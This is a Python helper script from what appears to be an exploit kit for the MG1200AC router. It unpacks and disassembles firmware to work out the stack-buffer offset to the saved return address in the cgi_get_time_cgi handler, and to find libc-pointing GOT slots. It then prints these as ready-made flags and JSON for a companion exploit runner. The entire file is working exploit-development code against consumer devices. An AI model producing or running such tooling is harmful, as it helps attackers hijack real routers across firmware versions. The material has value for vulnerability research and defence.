#!/usr/bin/env python3

"""Derive this chain's constants from an unpacked firmware rootfs."""

import json
import os
import re
import subprocess
import sys

import mg1200ac_core as core


def tool(name: str, *args: object) -> str:
    r = subprocess.run(
        ['mipsel-linux-gnu-' + name] + [str(a) for a in args],
        capture_output=True, text=True, check=True)
    return r.stdout


def sym_off(path: str, name: str) -> tuple[int | None, int | None, int | None]:
    """(value, size, index) of a dynamic FUNC symbol, as readelf prints them -
    readelf gives the value in hex and the size in decimal."""
    for row in tool('readelf', '--dyn-syms', '-W', path).splitlines():
        f = row.split()
        if len(f) > 7 and f[3] == 'FUNC' and f[-1] == name:
            return int(f[1], 16), int(f[2]), int(f[0].rstrip(':'))
    return None, None, None


def derive_pad(cgi: str) -> int | None:
    """`timer_day` -> saved $ra distance, from the handler's own frame
    layout."""
    off, size, _ = sym_off(cgi, 'cgi_get_time_cgi')
    if off is None:
        raise SystemExit(
            f'{cgi} exports no cgi_get_time_cgi - not a vendor cgi.so?')
    dis = tool(
        'objdump', '-d', f'--start-address={off:#x}',
        # the function whole, plus slack: objdump clamps at the end of the
        # section, so over-reading is harmless, while a window smaller than
        # the function can stop before the epilogue that stores $ra (V1.0.7's
        # cgi_get_time_cgi is 1548 B)
        f'--stop-address={off + max(0x600, (size or 0) + 0x40):#x}', cgi)
    # binutils prints these registers without a `$` prefix; the frame setup and
    # the O32 `.cpload` helper both address `sp` with a negative offset, so only
    # a positive, non-`sp` addiu is the buffer. The window can over-read into
    # the next function, so the first match of each is this function's own.
    # the buffer is the only positive frame-relative addiu whose destination is
    # not the frame pointer itself, and it comes first (the two images differ
    # in which register they use as frame pointer: V1.2.x keeps sp, V1.0.7
    # copies it into s8)
    buf = [int(m.group(1)) for m in re.finditer(
        r'addiu\s+\$?(?!sp\b)\w+,\s*\$?(?:sp|s8),(\d+)', dis)]
    # `$ra` can reach the frame either way: `sw ra,M(fp)` in the prologue
    # (V1.0.7) or `lw ra,M(fp)` in the epilogue (V1.2.x) - both are the same
    # slot
    ra = [int(m.group(1)) for m in re.finditer(
        r'(?:sw|lw)\s+\$?ra,(-?\d+)\(\$?(?:sp|s8)\)', dis)]
    return ra[0] - buf[0] if buf and ra else None


def derive_anchors(exe: str, libc: str) -> list[core.Anchor]:
    """GOT slots of the host that hold a libc pointer at a table-known
    offset."""
    slots = dict((m.group(2), int(m.group(1), 16)) for m in re.finditer(
        r'^([0-9a-f]{8})\s+\S+\s+R_MIPS_JUMP_SLOT\s+\S+\s+(\S+)',
        tool('readelf', '-rW', exe), re.M))
    anchors: list[core.Anchor] = []
    for sym in ('memset', 'write', 'strlen'):
        if sym in slots:
            anchors.append(('abs', slots[sym], sym))
    if not anchors:  # lazily bound host: compute from the global GOT
        # readelf pads the index column, so this must be matched, not split:
        # `[ 5]` is two words and `[10]` one, and only the first form puts the
        # address in the fourth
        m = re.search(
            r'\.got\s+\S+\s+([0-9a-f]{8})', tool('readelf', '-SW', exe))
        if not m:
            raise SystemExit(f'{exe}: no .got address in its section table')
        got = int(m.group(1), 16)
        dyn = tool('readelf', '-dW', exe)
        lg_m = re.search(r'LOCAL_GOTNO\)\s+(\d+)', dyn)
        gs_m = re.search(r'MIPS_GOTSYM\)\s+0x([0-9a-f]+)', dyn)
        if not (lg_m and gs_m):
            raise SystemExit(
                f'{exe}: no LOCAL_GOTNO/MIPS_GOTSYM in its dynamic section')
        lg = int(lg_m.group(1))
        gs = int(gs_m.group(1), 16)
        for sym in ('memset', 'write', 'strlen'):
            _, _, idx = sym_off(exe, sym)
            if idx:
                anchors.append(('abs', got + 4 * (lg + idx - gs), sym))
    # keep only slots whose symbol really sits at the shared libc offset
    return [a for a in anchors if sym_off(libc, a[2])[0] == core.LIBC.get(a[2])]


def derive_rootfs(rootfs: str) -> core.Preset:
    """Read pad and GOT anchors out of an unpacked squashfs root."""
    exe = os.path.join(rootfs, 'app/radio_power/webs/app.cgi')
    cgi = os.path.join(rootfs, 'lib/cgi.so')
    libc = os.path.join(rootfs, 'lib/libc.so.0')
    for p in (exe, cgi, libc):
        if not os.path.exists(p):
            raise SystemExit(f'{p} missing - is {rootfs} an unpacked rootfs?')
    for t in ('readelf', 'objdump'):
        if subprocess.run(
                ['which', 'mipsel-linux-gnu-' + t],
                capture_output=True).returncode:
            raise SystemExit(f'needs mipsel-linux-gnu-{t} on PATH')
    pad = derive_pad(cgi)
    pads = [] if pad is None else [pad]
    anchors = derive_anchors(exe, libc)
    if not anchors:
        print('  [!] no usable GOT anchor (no symbol matched the libc table)')
    return {'pads': pads, 'anchors': anchors}


def main() -> int:
    import argparse

    parser = argparse.ArgumentParser(
        description='Derive MG1200AC exploit constants from an unpacked '
        'firmware rootfs.')
    parser.add_argument(
        'rootfs', help='unpacked squashfs root (unsquashfs of the ROM image)')
    parser.add_argument(
        '-o', '--out', metavar='FILE',
        help='write the derived constants as JSON for '
        '`mg1200ac_run.py --constants`')
    args = parser.parse_args()

    pre = derive_rootfs(args.rootfs)
    print(f'[+] {args.rootfs}')
    for p in pre['pads']:
        print(f'    pad      {p}  (run --pad {p})')
    for a in pre['anchors']:
        print(
            f'    anchor   {core.describe(a)}  (run --got {a[1]:#x} '
            f'--got-sym {a[2]})')
    if not pre['pads'] or not pre['anchors']:
        print(
            '[!] incomplete: this firmware needs a manual look '
            '(README §1.2, §4.3)')
    if args.out:
        with open(args.out, 'w', encoding='utf-8') as f:
            json.dump(
                {
                    'pads': pre['pads'],
                    'anchors': [list(a) for a in pre['anchors']]},
                f, indent=1)
        print(f'[+] wrote {args.out}: run with --constants {args.out}')
    return 0 if pre['pads'] and pre['anchors'] else 1


if __name__ == '__main__':
    sys.exit(main())
